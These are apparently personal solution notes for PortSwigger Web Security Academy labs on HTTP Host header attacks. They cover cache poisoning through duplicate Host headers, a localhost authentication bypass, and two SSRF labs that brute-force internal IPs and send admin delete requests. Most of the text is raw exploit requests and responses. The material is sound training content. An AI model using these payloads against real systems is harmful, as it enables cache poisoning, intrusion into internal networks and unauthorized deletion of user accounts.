---
description: https://portswigger.net/web-security/host-header
---

# HTTP Host header attacks

### Lab: Web cache poisoning via ambiguous requests

This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site's home page.

To solve the lab, poison the cache so the home page executes alert(document.cookie) in the victim's browser.

```
GET / HTTP/1.1
Host: aca21fda1e02fa41c09e7b5d00b800ba.web-security-academy.net
Host: test

In response:
<script type="text/javascript" src="//test/resources/js/tracking.js"></script>
```

**Exploit Server ->**

```
File:
	/resources/js/tracking.js
Body:
	alert(document.cookie)
```

**Solution:**

```
GET / HTTP/1.1
Host: aca21fda1e02fa41c09e7b5d00b800ba.web-security-academy.net
Host: exploit-acf41f041e12fa04c0737b2e0120004e.web-security-academy.net
```

### Lab: Host header authentication bypass

This lab makes an assumption about the privilege level of the user based on the HTTP Host header.

To solve the lab, access the admin panel and delete Carlos's account.

`/robots.txt -> /admin`

```
GET /admin HTTP/1.1

In the response:
Admin interface only available to local users
```

**Solution:**

```
GET /admin HTTP/1.1
Host: localhost

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
```

### Lab: Routing-based SSRF

This lab is vulnerable to routing-based SSRF via the Host header. You can exploit this to access an insecure intranet admin panel located on an internal IP address.

To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos.

```
GET / HTTP/1.1
Host: 192.168.0.0/admin

In the response:
Server Error: Gateway Timeout (3) connecting to 192.168.0.0/admin
```

Sniper Attack -> Numbers -> Sequential, From:0, To:255, Step:1, Max fraction digits:0

```
GET / HTTP/1.1
Host: 192.168.0.§0§
```

```
GET / HTTP/1.1
Host: 192.168.0.96

In the response:
HTTP/1.1 302 Found
Location: /admin

GET /admin HTTP/1.1
Host: 192.168.0.96

In the response:
<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
	<input required type="hidden" name="csrf" value="YNlVztezGfPEmYLGVBW8Ho82YylVqqx7">
	<label>Username</label>
	<input required type='text' name='username'>
	<button class='button' type='submit'>Delete user</button>
</form>
```

**Solution:**

```
POST /admin/delete HTTP/1.1
Host: 192.168.0.96
...
username=carlos&csrf=YNlVztezGfPEmYLGVBW8Ho82YylVqqx7
```

### Lab: SSRF via flawed request parsing

This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address.

To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos.

```
GET https://ac741fe01f2a7d86c047320900fb00d2.web-security-academy.net/ HTTP/1.1

Host: c7kuceek5r1hnrf5lf7u2u7c43atyi.burpcollaborator.net
### Got request to the collaborator
```

Sniper Attack -> Numbers -> Sequential, From:0, To:255, Step:1, Max fraction digits:0

```
GET https://ac741fe01f2a7d86c047320900fb00d2.web-security-academy.net/ HTTP/1.1
Host: 192.168.0.§0§
```

```
GET https://ac741fe01f2a7d86c047320900fb00d2.web-security-academy.net/ HTTP/1.1
Host: 192.168.0.223

In the response:
HTTP/1.1 302 Found
Location: /admin
Connection: close
Content-Length: 0

GET https://ac741fe01f2a7d86c047320900fb00d2.web-security-academy.net/admin HTTP/1.1
Host: 192.168.0.223

In the response:
<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
	<input required type="hidden" name="csrf" value="dKsfuHNicZ0WIITPeG6aiWQ2dlYDNtoR">
	<label>Username</label>
	<input required type='text' name='username'>
	<button class='button' type='submit'>Delete user</button>
</form>
```

**Solution:**

```
POST https://ac741fe01f2a7d86c047320900fb00d2.web-security-academy.net/admin/delete HTTP/1.1
Host: 192.168.0.223
...
username=carlos&csrf=dKsfuHNicZ0WIITPeG6aiWQ2dlYDNtoR
```
